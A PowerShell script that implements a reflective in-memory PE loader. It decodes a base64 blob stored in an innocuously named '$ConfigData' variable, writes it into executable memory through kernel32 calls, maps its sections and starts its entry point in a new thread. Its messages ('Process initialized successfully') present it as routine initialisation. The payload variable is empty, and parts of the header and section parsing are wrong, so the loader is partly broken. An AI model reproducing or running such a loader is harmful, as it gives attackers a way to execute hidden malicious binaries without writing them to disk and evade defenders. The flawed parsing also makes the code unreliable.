$ConfigData = ''

$Kernel32 = @'
using System;
using System.Runtime.InteropServices;
public class NativeAPI {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr addr, uint size, uint newProtect, out uint oldProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr module, string procName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string moduleName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr attrs, uint stack, IntPtr start, IntPtr param, uint flags, out uint tid);
    
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr addr, uint size, uint type);
}
'@
Add-Type $Kernel32

function Invoke-Loader {
    param([byte[]] $BinaryData)
    
    $allocSize = [uint32]$BinaryData.Length
    $hKernel = [NativeAPI]::GetModuleHandle("kernel32.dll")
    
    $pBase = [NativeAPI]::VirtualAlloc([IntPtr]::Zero, $allocSize, 0x3000, 0x40)
    if ($pBase -eq [IntPtr]::Zero) {
        throw "Memory allocation failed"
    }
    
    [System.Runtime.InteropServices.Marshal]::Copy($BinaryData, 0, $pBase, $BinaryData.Length)
    
    $dosMagic = [System.Runtime.InteropServices.Marshal]::ReadInt16($pBase)
    if ($dosMagic -ne 0x5A4D) {
        throw "Invalid binary format"
    }
    
    $peOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32($pBase + 0x3C)
    $peSig = [System.Runtime.InteropServices.Marshal]::ReadInt32($pBase + $peOffset)
    if ($peSig -ne 0x4550) {
        throw "PE signature not found"
    }
    
    $numSections = [System.Runtime.InteropServices.Marshal]::ReadInt16($pBase + $peOffset + 0x06)
    $optHeaderSize = [System.Runtime.InteropServices.Marshal]::ReadInt16($pBase + $peOffset + 0x14)
    $sectionOffset = $peOffset + 0x18 + $optHeaderSize
    
    $is64Bit = [System.Runtime.InteropServices.Marshal]::ReadInt16($pBase + $peOffset + 0x18) -eq 0x20B
    
    if ($is64Bit) {
        $imageBase = [System.Runtime.InteropServices.Marshal]::ReadInt64($pBase + $peOffset + 0x30)
        $entryPoint = [System.Runtime.InteropServices.Marshal]::ReadInt32($pBase + $peOffset + 0x28)
    } else {
        $imageBase = [System.Runtime.InteropServices.Marshal]::ReadInt32($pBase + $peOffset + 0x28)
        $entryPoint = [System.Runtime.InteropServices.Marshal]::ReadInt32($pBase + $peOffset + 0x28)
    }
    
    for ($i = 0; $i -lt $numSections; $i++) {
        $secPtr = $sectionOffset + ($i * 40)
        $vSize = [System.Runtime.InteropServices.Marshal]::ReadInt32($secPtr + 8)
        $vAddr = [System.Runtime.InteropServices.Marshal]::ReadInt32($secPtr + 12)
        $rSize = [System.Runtime.InteropServices.Marshal]::ReadInt32($secPtr + 16)
        $rOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32($secPtr + 20)
        $chars = [System.Runtime.InteropServices.Marshal]::ReadInt32($secPtr + 36)
        
        if ($rSize -gt 0 -and $rSize -le $allocSize -and $rOffset -gt 0) {
            $srcPtr = [IntPtr](($pBase).ToInt64() + $rOffset)
            $dstPtr = [IntPtr](($pBase).ToInt64() + $vAddr)
            [System.Runtime.InteropServices.Marshal]::Copy([byte[]]@(0), 0, $dstPtr, 0) | Out-Null
            $srcBytes = New-Object byte[] $rSize
            [System.Runtime.InteropServices.Marshal]::Copy($srcPtr, $srcBytes, 0, $rSize)
            [System.Runtime.InteropServices.Marshal]::Copy($srcBytes, 0, $dstPtr, $rSize)
        }
    }
    
    $oldProtect = [uint32]0
    [NativeAPI]::VirtualProtect($pBase, $allocSize, 0x20, [ref]$oldProtect) | Out-Null
    
    $entryAddr = [IntPtr](($pBase).ToInt64() + $entryPoint)
    $hThread = [NativeAPI]::CreateThread([IntPtr]::Zero, 0, $entryAddr, [IntPtr]::Zero, 0, [ref][uint32]0)
    
    if ($hThread -ne [IntPtr]::Zero) {
        [NativeAPI]::WaitForSingleObject($hThread, 0xFFFFFFFF) | Out-Null
    }
    
    return $true
}

try {
    $decodedBytes = [Convert]::FromBase64String($ConfigData)
    $result = Invoke-Loader -BinaryData $decodedBytes
    if ($result) {
        Write-Verbose "Process initialized successfully" -Verbose
    }
} catch {
    Write-Error "Initialization failed: $($_.Exception.Message)"
    exit 1
}